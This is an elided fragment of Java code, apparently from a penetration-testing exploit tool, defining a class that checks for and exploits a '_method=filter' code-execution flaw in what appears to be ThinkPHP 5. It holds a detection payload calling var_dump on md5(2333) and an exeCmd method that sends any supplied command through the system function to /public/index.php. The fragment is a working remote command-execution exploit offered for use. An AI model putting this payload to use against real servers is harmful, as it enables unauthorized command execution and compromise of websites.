...
public class TP5_method_filter_code_exec implements ExploitInterface {
    ...
    public String checkVul(String url) {
        ...
        String payload = "c=var_dump&f=md5(2333)&_method=filter";
    ...
    public String exeCmd(String cmd, String encoding) {
        String url = this.target + "/public/index.php";
        String payload = "c=system&f=" + cmd + "&_method=filter";
